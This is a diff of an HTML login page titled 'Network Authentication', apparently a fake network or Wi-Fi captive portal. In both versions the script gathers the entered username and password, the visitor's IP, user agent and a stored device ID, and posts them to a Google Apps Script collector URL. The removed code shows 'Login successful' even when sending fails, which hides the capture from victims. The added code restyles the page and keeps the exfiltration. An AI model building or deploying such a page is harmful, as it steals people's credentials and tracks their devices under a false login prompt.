@@ -14,127 +14,111 @@
       height: 100vh;
       margin: 0;
     }
-
-    .container {
-      background: #f8f9fa;
-      padding: 25px 30px;
-      border-radius: 15px;
-      width: 300px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+    .form-container {
       border: 1px solid #ddd;
-      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      padding: 30px;
+      width: 320px;
     }
-
     h2 {
-      color: #333;
+      text-align: center;
+      color: #00704a;
       margin-bottom: 20px;
     }
-
-    input {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
+      margin: 8px 0;
       border: 1px solid #ccc;
-      font-size: 15px;
+      border-radius: 8px;
     }
-
     button {
       width: 100%;
       padding: 10px;
-      background-color: #007bff;
-      color: #fff;
+      background-color: #00704a;
+      color: white;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
       cursor: pointer;
+      font-size: 16px;
     }
-
     button:hover {
-      background-color: #0056b3;
+      background-color: #005c3a;
     }
-
-    .success {
-      color: green;
-      font-size: 14px;
-      margin-top: 10px;
+    #response {
+      text-align: center;
+      margin-top: 15px;
+      color: red;
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="form-container">
     <h2>Network Authentication</h2>
-    <form id="loginForm">
+    <form id="authForm">
       <input type="text" name="username" placeholder="Username" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Login</button>
-      <div id="response" class="success"></div>
     </form>
+    <div id="response"></div>
   </div>
 
   <script>
-    const form = document.getElementById("loginForm");
-    const responseEl = document.getElementById("response");
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzdnme2wJ3yraQkfeslYEbapcaHXZETLmbibHEUBVESaHHRAeUM6F48T-H1CX11G5HA/exec'; // <---- paste your Google Script URL here
+    const form = document.getElementById('authForm');
+    const responseEl = document.getElementById('response');
 
     async function getUserIP() {
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
+        const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        return data.ip || "Unavailable";
+        return data.ip;
       } catch {
-        return "Unavailable";
+        return 'Unavailable';
       }
     }
 
-    function getUserAgent() {
-      return navigator.userAgent || "Unavailable";
-    }
-
-    function getOrCreateDeviceID() {
-      let id = localStorage.getItem("deviceID");
+    function getDeviceID() {
+      let id = localStorage.getItem('deviceID');
       if (!id) {
         id = crypto.randomUUID();
-        localStorage.setItem("deviceID", id);
+        localStorage.setItem('deviceID', id);
       }
       return id;
     }
 
-    form.addEventListener("submit", async (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      responseEl.textContent = "";
+      responseEl.textContent = 'Submitting...';
 
       const formData = new FormData(form);
       const ip = await getUserIP();
-      const userAgent = getUserAgent();
-      const deviceID = getOrCreateDeviceID();
+      const userAgent = navigator.userAgent;
+      const deviceID = getDeviceID();
 
-      formData.append("ip", ip);
-      formData.append("userAgent", userAgent);
-      formData.append("deviceID", deviceID);
-
-      const params = new URLSearchParams(formData);
-
-      // ✅ Replace this URL with your deployed Google Apps Script Web App URL
-      const scriptURL = "https://script.google.com/macros/s/AKfycbwZ31g7HdS1PiRN7Ig5gd4C9Jeur4dwVhUU6p25pv11El7jD91iT4316E03zmeNstfs/exec";
+      formData.append('ip', ip);
+      formData.append('userAgent', userAgent);
+      formData.append('deviceID', deviceID);
 
       try {
         const res = await fetch(scriptURL, {
-          method: "POST",
-          body: params,
+          method: 'POST',
+          body: formData,
         });
 
         if (res.ok) {
-          responseEl.textContent = "Login successful";
+          responseEl.style.color = 'green';
+          responseEl.textContent = 'Success!';
           form.reset();
         } else {
-          // silently fail but never show error
-          responseEl.textContent = "Login successful";
-          form.reset();
+          throw new Error('Network response not ok');
         }
-      } catch {
-        // even if network fails, still show success
-        responseEl.textContent = "Login successful";
-        form.reset();
+      } catch (err) {
+        responseEl.style.color = 'red';
+        responseEl.textContent = 'Error: Load failed';
+        console.error(err);
       }
     });
   </script>
